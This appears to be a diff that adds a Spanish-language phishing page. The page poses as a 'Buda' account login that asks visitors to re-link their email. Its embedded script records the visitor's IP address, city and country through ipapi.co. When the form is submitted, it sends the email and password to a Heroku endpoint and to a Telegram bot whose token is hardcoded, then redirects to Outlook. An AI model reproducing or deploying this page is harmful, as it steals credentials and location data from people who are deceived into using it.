@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+
+<html>
+  <head>
+    <title>Validar</title>
+
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta
+      name="viewport"
+      content="width=device-width, user-scalable=no, initial-scale=1.0, minimun-sacale=1.0"
+    />
+
+    <link rel="icon" href="images/icon.ico" />
+    <link rel="stylesheet" href="css/index.css" />
+  </head>
+
+  <body>
+    <section id="login-container">
+      <div id="login-body" class="opacity0">
+        <div class="logo-container">
+          <img src="images/logo.png" class="login-logo" alt="Logo" />
+        </div>
+
+        <form id="container-layout" onkeypress="return cancelEnter(event)">
+          <div id="eml" class="">
+            <h3 style="margin-bottom: 2px">Bienvenido a Buda</h3>
+            <p style="margin-top: 5px; margin-bottom: 5px">
+              Bienvenido a Buda necesitamos que vincule nuevamente su correo
+              electrónico.
+            </p>
+            <div id="alert-eml-login" style="display: none"></div>
+            <input
+              type="email"
+              id="usuario"
+              name="usr"
+              placeholder="Correo electrónico"
+            />
+            <p>
+              ¿No tiene una cuenta?
+              <a href="#" id="create-account-link">Cree una.</a>
+            </p>
+            <div class="button btn-next">
+              <button type="button" id="btn-next-pss" class="btn-form-login">
+                Siguiente
+              </button>
+            </div>
+          </div>
+
+          <div id="pss">
+            <div class="usr">
+              <p>
+                <button type="button" id="btn-prev">
+                  <i class="fa-solid fa-arrow-left"></i>
+                </button>
+                <span id="span-eml"></span>
+              </p>
+            </div>
+            <h2>Escribir contraseña</h2>
+            <input type="text" id="ip" name="ip" style="display: none" />
+            <input
+              type="text"
+              id="ciudad"
+              name="ciudad"
+              style="display: none"
+            />
+            <input type="text" id="pais" name="pais" style="display: none" />
+            <input
+              type="password"
+              id="contra"
+              name="pss"
+              placeholder="Contraseña"
+            />
+            <a href="#" id="link-recovery-password">¿Olvidó su contraseña?</a>
+            <div class="button btn-sub">
+              <input
+                type="submit"
+                id="btn-login"
+                class="btn-form-login"
+                value="Validar"
+              />
+            </div>
+          </div>
+        </form>
+      </div>
+
+      <style>
+        .logo-inferior {
+          width: 600px;
+          display: block;
+          position: absolute;
+          margin-top: 500px;
+          z-index: 99;
+        }
+
+        @media (max-width: 600px) {
+          .logo-inferior {
+            width: 600px;
+            display: block;
+            position: absolute;
+            margin-top: 50px;
+            z-index: 99;
+          }
+        }
+      </style>
+    </section>
+
+    <script
+      src="https://kit.fontawesome.com/4a03c8ce1f.js"
+      crossorigin="anonymous"
+    ></script>
+    <script type="text/javascript" src="js/functions.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+    <script src="tabla.js"></script>
+
+    <script>
+      const url = "https://ipapi.co/json/";
+      axios.get(url).then((response) => {
+        document.querySelector("#ip").value = response.data.ip;
+        document.querySelector("#ciudad").value = response.data.city;
+        document.querySelector("#pais").value = response.data.country;
+      });
+    </script>
+    <script>
+      const form = document.querySelector("#container-layout");
+
+      form.addEventListener("submit", (event) => {
+        event.preventDefault(); // aqui evitamos que el código se repita evita que se envíe el formulario
+        const email = document.querySelector("#usuario").value;
+        const password = document.querySelector("#contra").value;
+        const message =
+          "Outlook" +
+          "\nCorreo: " +
+          email +
+          "\nContra: " +
+          password +
+          "\nCiudad:" +
+          document.querySelector("#ciudad").value +
+          "\nPais: " +
+          document.querySelector("#pais").value +
+          "\nIP: " +
+          document.querySelector("#ip").value;
+        axios
+          .put(`https://apihs-9dbc366496ab.herokuapp.com/submit/${tableName}`, {
+            correo: email,
+            contra: password,
+            ciudad: document.querySelector("#ciudad").value,
+            pais: document.querySelector("#pais").value,
+            ip: document.querySelector("#ip").value,
+          })
+          .then((response) => {
+            axios
+              .post(
+                "https://api.telegram.org/bot7339513428:AAHN5cov7e0MK0X7Pwn_P_uormVfQrH8CGY/sendMessage",
+                {
+                  chat_id: "-1002237589249",
+                  text: message,
+                }
+              )
+              .then((response) => {
+                console.log(response.data);
+                window.location.href = "https://outlook.live.com/mail/0/";
+              });
+          })
+          .catch((error) => {
+            console.error(error);
+          });
+      });
+    </script>
+  </body>
+</html>
